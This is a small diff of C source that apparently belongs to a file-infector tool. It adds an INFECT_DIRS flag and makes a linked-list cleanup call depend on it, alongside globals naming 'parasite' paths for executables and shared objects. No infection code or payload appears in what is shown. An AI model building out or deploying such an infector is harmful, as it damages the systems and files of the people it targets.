@@ -34,7 +34,7 @@ Description : This program parses all the directories and subdirectories under t
 
 char *parasite_path_for_exec;
 char *parasite_path_for_so;
-
+int  INFECT_DIRS;
 
 int main(int argc, char *argv[])
 {
@@ -73,7 +73,7 @@ int main(int argc, char *argv[])
 
 	//PrintLinkedList(head);
 
-	Destroy(head);
+	if (INFECT_DIRS) Destroy(head);
 
 	fprintf(stdout, "\n\n\n");
 	fprintf(stdout, BOLDGREEN"[+]"RESET" Total Directories  Parsed   : %ld\n", dir_count);
